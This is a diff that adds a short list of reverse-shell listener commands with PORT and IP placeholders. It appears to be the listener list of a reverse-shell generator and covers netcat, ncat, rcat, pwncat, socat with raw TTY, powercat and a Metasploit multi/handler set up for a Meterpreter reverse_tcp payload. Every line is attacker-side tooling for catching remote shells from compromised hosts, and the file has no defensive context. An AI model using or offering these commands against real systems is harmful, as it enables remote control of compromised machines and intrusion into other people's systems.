@@ -1,0 +1,13 @@
+nc -lvnp PORT
+ncat -lvnp PORT
+ncat.exe -lvnp PORT
+ncat.exe -lvnp PORT
+ncat.exe -lvnp PORT
+rcat -lp PORT
+rcat -lHp PORT
+python3 -m pwncat -lp PORT
+stty raw -echo; (stty size; cat) | nc -lvnp PORT
+socat -d -d TCP-LISTEN:PORT STDOUT
+socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:PORT
+powercat -l -p PORT
+msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost IP; set lport PORT; exploit"
